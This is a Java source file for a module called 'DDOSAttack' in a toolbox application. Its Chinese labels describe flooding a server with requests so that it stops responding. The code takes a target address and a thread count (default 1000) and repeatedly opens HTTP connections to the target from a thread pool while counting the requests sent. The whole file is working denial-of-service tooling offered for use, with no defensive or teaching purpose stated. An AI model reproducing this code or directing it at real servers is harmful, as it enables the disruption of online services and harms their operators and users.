package com.godpalace.godbox.modules;

import com.godpalace.godbox.module_mgr.Module;
import com.godpalace.godbox.module_mgr.ModuleArg;
import com.godpalace.godbox.ui.BoxShowPanel;
import com.godpalace.godbox.ui.ModuleSettingsPanel;
import lombok.Getter;
import lombok.Setter;

import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

@Getter
public class DDOSAttack implements Module {
    @Setter
    private ModuleSettingsPanel settingsPanel;

    @Setter
    private boolean entered;
    private final AtomicBoolean enabled = new AtomicBoolean(false);

    @Setter
    private String keyBind = "None";

    private final String displayName = "DDOS攻击";
    private final String description = "通过发送大量的请求攻击服务器，使服务器无法正常响应";
    private final String typeListName = "NETWORK";

    @Setter
    private ModuleArg[] args = new ModuleArg[]{
            new ModuleArg("服务器地址", "string", "", "", "", ""),
            new ModuleArg("攻击间隔(ms)", "int", 0, 0, 1000000, 1),
            new ModuleArg("线程数", "int", 1000, 1, 1000000, 1),
            new ModuleArg("发包数量", "show", "0", "", "", "")
    };

    private String address;
    private int attackInterval;
    private int threadCount;
    private int packetCount;

    private final Thread attackThread = new Thread(() -> {
        while(enabled.get()){
            try {
                URL url = new URL(address);
                URLConnection conn = url.openConnection();
                packetCount++;
                args[3].setValue(packetCount);
                conn.getInputStream();

                Thread.sleep(attackInterval);
            } catch (Exception ignored) {}
        }
    });

    @Override
    public boolean isEnabled() {
        return enabled.get();
    }

    @Override
    public void Enable() {
        enabled.set(true);
        packetCount = 0;
        address = args[0].getValue().toString();
        attackInterval = Integer.parseInt(args[1].getValue().toString());
        threadCount = Integer.parseInt(args[2].getValue().toString());

        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        for (int i = 0; i < threadCount; i++) {
            executor.execute(attackThread);
        }
        executor.shutdown();
    }

    @Override
    public void Disable() {
        enabled.set(false);
        packetCount = 0;
        args[3].setValue(packetCount);
    }

    @Override
    public void init() {
        BoxShowPanel showPanel = (BoxShowPanel) args[3].getComponent();
        showPanel.setAutoShow(true, 100);
    }
}